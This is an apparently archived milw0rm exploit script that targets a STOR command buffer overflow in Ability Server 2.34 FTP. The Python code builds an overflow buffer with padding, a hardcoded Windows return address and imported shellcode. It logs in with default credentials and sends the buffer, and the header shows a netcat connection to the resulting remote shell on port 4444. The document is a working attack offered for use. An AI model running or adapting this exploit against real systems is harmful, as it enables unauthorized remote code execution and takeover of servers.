###################################
# Ability Server 2.34 FTP STOR Buffer Overflow   #
# Advanced, secure and easy to use FTP Server. #
# 21 Oct 2004 - muts                                      #
###################################
# D:\BO>ability-2.34-ftp-stor.py                       #
###################################
# D:\data\tools>nc -v 127.0.0.1 4444               #
# localhost [127.0.0.1] 4444 (?) open               #
# Microsoft Windows XP [Version 5.1.2600]        #
# (C) Copyright 1985-2001 Microsoft Corp.        #
# D:\Program Files\abilitywebserver>                #
###################################

import ftplib
from ftplib import FTP
import struct

from payload import buf

def shell_attack(target_machine, target_port):

# Shellcode taken from Sergio Alvarez's "Win32 Stack Buffer Overflow Tutorial"

   

    # Change RET address if need be.

    buffer = b'\x41'*966+struct.pack(b'<L', 0x7C2FA0F7)+b'\x42'*32+buf # RET Windows 2000 Server SP4
    # buffer = b'\x41'*970+struct.pack(b'<L', 0x7D17D737)+b'\x42'*32+buf # RET Windows XP SP2

    try:
    # Edit the IP, Username and Password.
        ftp = FTP(target_machine) 
        ftp.login('ftp','ftp')
     
    except:
       print("\nCould not Connect to FTP Server.")
    try:
      ftp.transfercmd(b"STOR " + buffer) 
    except:
      print("\nDone.")

    # milw0rm.com [2004-10-21]